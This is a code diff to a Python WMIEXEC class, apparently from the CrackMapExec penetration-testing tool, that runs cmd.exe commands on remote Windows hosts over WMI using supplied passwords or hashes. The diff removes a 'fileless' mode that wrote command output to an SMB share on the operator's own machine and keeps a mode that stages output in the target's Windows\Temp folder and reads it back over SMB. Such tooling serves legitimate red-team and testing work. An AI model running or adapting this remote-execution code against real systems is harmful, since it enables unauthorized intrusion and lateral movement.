@@ -1,5 +1,4 @@
 import ntpath, logging
-import os
 
 from gevent import sleep
 from cme.helpers import gen_random_string
@@ -8,7 +7,7 @@ from impacket.dcerpc.v5.dcom import wmi
 from impacket.dcerpc.v5.dtypes import NULL
 
 class WMIEXEC:
-    def __init__(self, target, share_name, username, password, domain, smbconnection, hashes=None, share=None):
+    def __init__(self, target, username, password, domain, smbconnection, hashes=None, share=None):
         self.__target = target
         self.__username = username
         self.__password = password
@@ -19,7 +18,6 @@ class WMIEXEC:
         self.__smbconnection = smbconnection
         self.__output = None
         self.__outputBuffer = ''
-        self.__share_name = share_name
         self.__shell = 'cmd.exe /Q /c '
         self.__pwd = 'C:\\'
         self.__aesKey = None
@@ -48,8 +46,9 @@ class WMIEXEC:
         self.__retOutput = output
         if self.__retOutput:
             self.__smbconnection.setTimeout(100000)
+            self.cd('\\')
 
-        self.execute_handler(command)
+        self.execute_remote(command)
         self.__dcom.disconnect()
         return self.__outputBuffer
 
@@ -63,20 +62,7 @@ class WMIEXEC:
             self.execute_remote('cd ')
             self.__pwd = self.__outputBuffer.strip('\r\n')
             self.__outputBuffer = ''
-
-    def output_callback(self, data):
-        self.__outputBuffer += data
-
-    def execute_handler(self, data):
-        if self.__retOutput:
-            try:
-                self.execute_fileless(data)
-            except:
-                self.cd('\\')
-                self.execute_remote(data)
-        else:
-            self.execute_remote(data)
-
+    
     def execute_remote(self, data):
         self.__output = '\\Windows\\Temp\\' + gen_random_string(6)
 
@@ -86,35 +72,20 @@ class WMIEXEC:
 
         logging.debug('Executing command: ' + command)
         self.__win32Process.Create(command, self.__pwd, None)
-        self.get_output_remote()
+        self.get_output()
 
-    def execute_fileless(self, data):
-        self.__output = gen_random_string(6)
-        local_ip = self.__smbconnection.getSMBServer().get_socket().getsockname()[0]
+    def get_output(self):
 
-        command = self.__shell + data + ' 1> \\\\{}\\{}\\{} 2>&1'.format(local_ip, self.__share_name, self.__output)
-
-        logging.debug('Executing command: ' + command)
-        self.__win32Process.Create(command, self.__pwd, None)
-        self.get_output_fileless()
-
-    def get_output_fileless(self):
-        while True:
-            try:
-                with open(os.path.join('/tmp', 'cme_hosted', self.__output), 'r') as output:
-                    self.output_callback(output.read())
-                break
-            except IOError:
-                sleep(2)
-
-    def get_output_remote(self):
         if self.__retOutput is False:
             self.__outputBuffer = ''
             return
 
+        def output_callback(data):
+            self.__outputBuffer += data
+
         while True:
             try:
-                self.__smbconnection.getFile(self.__share, self.__output, self.output_callback)
+                self.__smbconnection.getFile(self.__share, self.__output, output_callback)
                 break
             except Exception as e:
                 if str(e).find('STATUS_SHARING_VIOLATION') >=0:
